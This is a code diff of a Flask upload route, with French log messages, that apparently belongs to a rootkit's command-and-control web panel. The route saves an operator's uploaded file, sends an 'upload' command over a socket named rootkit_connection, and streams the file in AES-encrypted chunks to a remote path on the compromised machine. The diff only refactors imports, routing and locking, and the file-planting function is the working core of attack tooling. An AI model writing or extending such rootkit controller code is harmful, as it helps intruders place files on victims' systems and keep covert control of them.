@@ -1,15 +1,13 @@
-import os
-from flask import Blueprint, render_template, request, redirect, url_for, flash, current_app
+from flask import Blueprint, render_template, redirect, request, flash, url_for
 from werkzeug.utils import secure_filename
-
-from utils.tools import authenticated, rootkit_connection, connection_lock
-from communication import send_to_server
-from encryption import aes_encrypt
+from utils.state import authenticated, app, rootkit_connection
+from utils.crypto import aes_encrypt
+from utils.socket_comm import send_to_server
+import os
 
 upload_bp = Blueprint('upload', __name__)
 
-
-@upload_bp.route('/upload', methods=['GET', 'POST'])
+@upload_bp.route('/', methods=['GET', 'POST'])
 def upload():
     if not authenticated:
         return redirect(url_for('auth.login'))
@@ -20,7 +18,7 @@ def upload():
 
         if uploaded_file and remote_path:
             filename = secure_filename(uploaded_file.filename)
-            local_path = os.path.join(current_app.config['UPLOAD_FOLDER'], filename)
+            local_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
             uploaded_file.save(local_path)
 
             try:
@@ -31,26 +29,24 @@ def upload():
 
     return render_template("upload.html")
 
-
 def upload_file_encrypted(local_path, remote_path):
     if not os.path.exists(local_path):
         print(f"[!] Le fichier local '{local_path}' n'existe pas.")
         return
 
     try:
-        with connection_lock:
-            send_to_server(rootkit_connection, f"upload {remote_path}")
+        send_to_server(rootkit_connection, f"upload {remote_path}")
 
-            with open(local_path, "rb") as f:
-                while True:
-                    chunk = f.read(4096)
-                    if not chunk:
-                        break
-                    encrypted = aes_encrypt(chunk)
-                    rootkit_connection.sendall(encrypted)
+        with open(local_path, "rb") as f:
+            while True:
+                chunk = f.read(4096)
+                if not chunk:
+                    break
+                encrypted = aes_encrypt(chunk)
+                rootkit_connection.sendall(encrypted)
 
-            rootkit_connection.sendall(b"EOF\n")
-            print(f"[+] Fichier '{local_path}' envoyé avec succès vers '{remote_path}'.")
+        rootkit_connection.sendall(b"EOF\n")
+        print(f"[+] Fichier '{local_path}' envoyé avec succès vers '{remote_path}'.")
 
     except Exception as e:
         print(f"[!] Erreur d'envoi : {e}")
